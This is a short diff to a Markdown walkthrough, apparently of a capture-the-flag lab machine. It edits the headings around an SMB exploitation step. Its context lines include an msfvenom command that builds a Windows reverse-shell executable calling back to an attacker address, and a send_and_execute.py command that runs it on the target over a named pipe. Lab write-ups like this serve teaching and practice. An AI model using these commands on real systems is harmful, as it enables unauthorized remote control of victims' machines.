@@ -67,8 +67,7 @@ Because guest authentication was allowed, I had to modify the exploit and checke
 I could see that it is a x64 architecture machine, and I could see that I found some named pipes I could use. </br>
 **Generate the Payload:** </br>
 ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=1234 EXITFUNC=thread -f exe  --platform windows -o reverseshell.exe``` </br>
-**Exploit:** </br>
-**Kali Linux** </br>
+**Kali Linux:** </br>
 Command: ```python2 send_and_execute.py 10.10.10.40 reverseshell.exe samr``` </br>
 ![initial_shell_exploit](images/blue/initial_shell_exploit.png) </br> </br>
 **Target Machine:** </br>
